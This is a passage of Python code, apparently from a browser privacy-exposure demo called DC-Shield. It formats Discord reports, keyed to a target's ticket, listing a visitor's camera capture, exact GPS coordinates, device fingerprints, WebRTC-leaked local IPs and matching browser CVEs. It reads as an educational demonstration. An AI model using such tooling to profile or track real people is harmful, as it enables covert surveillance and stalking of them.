        f"**Cross-origin isolated:** {mark(h.get('crossOriginIsolated'))}",
        f"**Secure context (HTTPS):** {mark(h.get('isSecureContext'))}",
        f"**Trusted Types:** {mark(h.get('trustedTypes'), 'available', 'not available')}",
        f"**Cookie Store API:** {mark(h.get('cookieStore'), 'available', 'not available')}",
        f"**Storage Access API:** {mark(h.get('storageAccessApi'), 'available', 'not available')}",
    ]
    return {
        "name": "🛡️ Hardening Posture",
        "value": "\n".join(lines),
        "inline": False,
    }


def _build_transport_field(data):
    """Server-side transport profile (Cloudflare/Sec-Fetch hints)."""
    t = data.get("_serverTransport")
    if not isinstance(t, dict) or not t:
        return None

    rows = []
    if t.get("isHttps") is not None:
        rows.append(f"**HTTPS:** {'✅' if t['isHttps'] else '❌'} (signals: `{t.get('secureContextHints', 0)}`)")
    if t.get("scheme") or t.get("forwardedProto") or t.get("cfScheme"):
        rows.append(
            f"**Scheme:** `{t.get('scheme', '?')}` · "
            f"X-Forwarded-Proto: `{t.get('forwardedProto', '—')}` · "
            f"CF-Visitor: `{t.get('cfScheme', '—')}`"
        )
    if t.get("cfRay") or t.get("cfCountry"):
        rows.append(
            f"**Cloudflare:** Ray `{t.get('cfRay', '—')}` · Country `{t.get('cfCountry', '—')}`"
        )
    sf = [k for k in ("secFetchSite", "secFetchMode", "secFetchDest") if t.get(k)]
    if sf:
        rows.append(
            "**Sec-Fetch:** "
            + " · ".join(f"`{k.replace('secFetch', '').lower()}={t[k]}`" for k in sf)
        )
    fvl = t.get("secChUaFullVersionList")
    if fvl:
        rows.append(f"**UA-CH full version (header):** `{fvl[:120]}`")
    if t.get("secChUaPlatform") or t.get("secChUaPlatformVersion"):
        rows.append(
            f"**Platform header:** `{t.get('secChUaPlatform', '?')} "
            f"{t.get('secChUaPlatformVersion', '')}`".strip()
        )
    if t.get("acceptLanguage"):
        rows.append(f"**Accept-Language:** `{t['acceptLanguage'][:60]}`")
    if not rows:
        return None
    return {
        "name": "🛰️ Transport Profile (server-side)",
        "value": "\n".join(rows),
        "inline": False,
    }


def _build_cve_field(data):
    """Passive browser CVE match summary."""
    cve = data.get("_serverCveMatches")
    if not isinstance(cve, dict) or cve.get("count", 0) == 0:
        return None

    sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "none": "⚪"}
    items = cve.get("items") or []
    sample_lines = []
    for it in items[:5]:
        cvss = it.get("cvss", 0.0)
        sev = it.get("severity", "?")
        summary = (it.get("summary") or "")[:90]
        sample_lines.append(
            f"{sev_emoji.get(sev, '⚪')} `{it.get('id')}` "
            f"CVSS `{cvss:.1f}` · fix `{it.get('fixed_in')}` — {summary}"
        )

    overflow = ""
    if len(items) > 5:
        overflow = f"\n_…and {len(items) - 5} more._"

    header = (
        f"**{cve['count']} known CVE(s)** affecting this browser version · "
        f"max CVSS `{cve.get('max_cvss', 0):.1f}` "
        f"({sev_emoji.get(cve.get('highest_severity', 'none'), '⚪')} `{cve.get('highest_severity')}`)\n\n"
    )

    value = header + "\n".join(sample_lines) + overflow
    # Discord field-value limit is 1024 chars
    if len(value) > 1020:
        value = value[:1017] + "..."
    return {
        "name": "🦠 Browser CVE Exposure",
        "value": value,
        "inline": False,
    }


def create_detailed_category_embed(data, category, dc_handle=None):
    """Create a detailed embed for a specific data category."""
    from datetime import datetime

    target = _safe_handle(dc_handle)

    category_configs = {
        "camera": {"title": "📸 CAMERA SURVEILLANCE DETAILS", "color": 0xFF0000},
        "location": {"title": "🌍 GPS LOCATION INTELLIGENCE", "color": 0xE74C3C},
        "hardware": {"title": "⚙️ HARDWARE PROFILE ANALYSIS", "color": 0x3498DB},
        "network": {"title": "📡 NETWORK INTELLIGENCE REPORT", "color": 0x9B59B6},
        "fingerprint": {"title": "🎨 DEVICE FINGERPRINT ANALYSIS", "color": 0xE67E22},
    }
    config = category_configs.get(
        category, {"title": "📊 DETAILED DATA ANALYSIS", "color": 0x95A5A6}
    )

    embed = {
        "title": f"{config['title']} — Ticket: {target}",
        "description": f"**Ticket:** `{target}`\nDetailed analysis of `{category}` data.",
        "color": config["color"],
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": f"Ticket {target} • DC-Shield {category.title()} Intelligence • Educational Demonstration",
            "icon_url": "https://cdn.discordapp.com/attachments/123456789/shield-icon.png",
        },
    }

    if category == "camera":
        cam = data.get("camera", {}) or {}
        if cam.get("captured"):
            embed["fields"].extend(
                [
                    {
                        "name": "📷 Capture",
                        "value": (
                            f"**Status:** ✅ captured\n"
                            f"**Timestamp:** `{cam.get('timestamp', '?')}`\n"
                            f"**Resolution:** 640×480 (JPEG, ~80% quality)"
                        ),
                        "inline": False,
                    },
                    {
                        "name": "⚠️ Privacy Impact",
                        "value": (
                            "**Sensitivity:** 🔴 Critical\n"
                            "**Type:** Visual biometric\n"
                            "**Mitigation:** Revoke camera permission"
                        ),
                        "inline": True,
                    },
                ]
            )
        else:
            embed["fields"].append(
                {
                    "name": "📷 Capture",
                    "value": "**Status:** ❌ no capture (permission denied or blocked)",
                    "inline": False,
                }
            )

    elif category == "location":
        geo = data.get("geolocation") or {}
        if geo.get("latitude") is not None:
            lat = geo.get("latitude")
            lng = geo.get("longitude")
            embed["fields"].extend(
                [
                    {
                        "name": "📍 Coordinates",
                        "value": (
                            f"**Latitude:** `{lat:.8f}`\n"
                            f"**Longitude:** `{lng:.8f}`\n"
                            f"**Accuracy:** ±{geo.get('accuracy', '?')} m"
                        ),
                        "inline": True,
                    },
                    {
                        "name": "🗺️ Motion / Altitude",
                        "value": (
                            f"**Altitude:** {geo.get('altitude') or '—'} m\n"
                            f"**Heading:** {geo.get('heading') or '—'}°\n"
                            f"**Speed:** {geo.get('speed') or '—'} m/s"
                        ),
                        "inline": True,
                    },
                    {
                        "name": "🔗 External Maps",
                        "value": (
                            f"• [Google Maps](https://www.google.com/maps?q={lat},{lng})\n"
                            f"• [OpenStreetMap](https://www.openstreetmap.org/?mlat={lat}&mlon={lng})"
                        ),
                        "inline": False,
                    },
                ]
            )
        else:
            embed["fields"].append(
                {
                    "name": "📍 Location",
                    "value": "**Status:** ❌ no geolocation (permission denied or blocked)",
                    "inline": False,
                }
            )

    elif category == "hardware":
        items = []
        if data.get("screen"):
            screen = data["screen"]
            items.append(
                {
                    "name": "🖥️ Display",
                    "value": (
                        f"**Resolution:** `{screen.get('width', '?')}×{screen.get('height', '?')}`\n"
                        f"**Color depth:** {screen.get('colorDepth', '?')}-bit\n"
                        f"**Pixel ratio:** {screen.get('pixelRatio', '?')}"
                    ),
                    "inline": True,
                }
            )
        if data.get("browser", {}).get("hardwareConcurrency"):
            items.append(
                {
                    "name": "⚙️ CPU",
                    "value": (
                        f"**Logical cores:** {data['browser']['hardwareConcurrency']}\n"
                        f"**Platform:** `{data.get('browser', {}).get('platform', '?')}`"
                    ),
                    "inline": True,
                }
            )
        if data.get("deviceMemory"):
            items.append(
                {
                    "name": "💾 Memory",
                    "value": f"**Device RAM:** {data['deviceMemory']} GB",
                    "inline": True,
                }
            )
        if data.get("memory"):
            mem = data["memory"]
            items.append(
                {
                    "name": "🧠 JS Heap",
                    "value": (
                        f"**Used:** {format_bytes(mem.get('usedJSHeapSize', 0))}\n"
                        f"**Total:** {format_bytes(mem.get('totalJSHeapSize', 0))}\n"
                        f"**Limit:** {format_bytes(mem.get('jsHeapSizeLimit', 0))}"
                    ),
                    "inline": True,
                }
            )
        if _is_valid_dict(data.get("battery")):
            bat = data["battery"]
            level = int((bat.get("level", 0) or 0) * 100)
            status = "charging" if bat.get("charging") else "discharging"
            items.append(
                {
                    "name": "🔋 Battery",
                    "value": (
                        f"**Level:** {level}%\n"
                        f"**Status:** {status}"
                    ),
                    "inline": True,
                }
            )
        if items:
            embed["fields"].extend(items)
        else:
            embed["fields"].append(
                {"name": "⚙️ Hardware", "value": "**Status:** ❌ no hardware data", "inline": False}
            )

    elif category == "network":
        items = []
        net = data.get("network") or {}
        if not net.get("error") and net:
            items.append(
                {
                    "name": "📡 Connection",
                    "value": (
                        f"**Type:** {net.get('effectiveType', '?')}\n"
                        f"**Downlink:** {net.get('downlink', '?')} Mbps\n"
                        f"**RTT:** {net.get('rtt', '?')} ms\n"
                        f"**Save data:** {net.get('saveData', False)}"
                    ),
                    "inline": True,
                }
            )
        webrtc = data.get("webrtc") or {}
        if webrtc.get("leakDetected"):
            local_ips = webrtc.get("localIPs", []) or []
            items.append(
                {
                    "name": "🔓 WebRTC Leak",
                    "value": (
                        f"**Status:** ⚠️ leak detected\n"
                        f"**Local IPs:** {', '.join(f'`{ip}`' for ip in local_ips) or '—'}\n"
                        f"**Risk:** 🔴 high (VPN bypass possible)"
                    ),
                    "inline": True,
                }
            )
        elif webrtc:
            items.append(
                {
                    "name": "🔒 WebRTC",
                    "value": "**Status:** ✅ no leaks detected",
                    "inline": True,
                }
            )
        if data.get("timezone"):
            tz = data["timezone"]
            offset_hours = (tz.get("offset", 0) or 0) / -60
            items.append(
                {
                    "name": "🌐 Timezone",
                    "value": (
                        f"**Zone:** `{tz.get('name', '?')}`\n"
                        f"**Offset:** UTC{offset_hours:+.1f}\n"
                        f"**Language:** `{data.get('browser', {}).get('language', '?')}`"
                    ),
                    "inline": True,
                }
            )
        if items:
            embed["fields"].extend(items)
        else:
            embed["fields"].append(
                {"name": "📡 Network", "value": "**Status:** ❌ no network data", "inline": False}
            )

    elif category == "fingerprint":
        items = []
        if data.get("canvas"):
            canvas_hash = (
                data["canvas"][:32] if isinstance(data["canvas"], str) else "?"
            )
            items.append(
                {
                    "name": "🎨 Canvas",
                    "value": (
                        f"**Hash:** `{canvas_hash}…`\n"
                        f"**Mitigation:** Canvas Blocker extension"
                    ),
                    "inline": True,
                }
            )
        webgl = data.get("webgl") or {}
        if not webgl.get("error") and webgl:
            vendor = (webgl.get("vendor") or "?")[:30]
            renderer = (webgl.get("renderer") or "?")[:30]
            items.append(
                {
                    "name": "🎮 WebGL",
                    "value": (
                        f"**Vendor:** `{vendor}`\n"
                        f"**Renderer:** `{renderer}`"
                    ),
                    "inline": True,
                }
            )
        audio = data.get("audioFingerprint") or {}
        if not audio.get("error") and audio:
            audio_hash = (audio.get("hash") or "?")[:32]
            items.append(
                {
                    "name": "🔊 Audio",
                    "value": f"**Hash:** `{audio_hash}…` _(cross-browser)_",
                    "inline": True,
                }
            )
        fonts = data.get("fonts") or {}
        if not fonts.get("error") and fonts:
            font_count = fonts.get("count", 0)
            installed = (fonts.get("installed", []) or [])[:5]
            items.append(
                {
                    "name": "🔤 Fonts",
                    "value": (
                        f"**Total:** {font_count}\n"
                        f"**Sample:** {', '.join(installed) if installed else '—'}"
                    ),
                    "inline": False,
                }
            )
        if data.get("cpuBenchmark"):
            cpu = data["cpuBenchmark"]
            items.append(
                {
                    "name": "⚡ CPU Benchmark",
                    "value": (
                        f"**Score:** {cpu.get('score', 0)}\n"
                        f"**Duration:** {cpu.get('duration', 0):.2f} ms"
                    ),
                    "inline": True,
                }
            )
        if items:
            embed["fields"].extend(items)
        else:
            embed["fields"].append(
                {
                    "name": "🔍 Fingerprint",
                    "value": "**Status:** ❌ no fingerprint data",
                    "inline": False,
                }
            )

    return embed
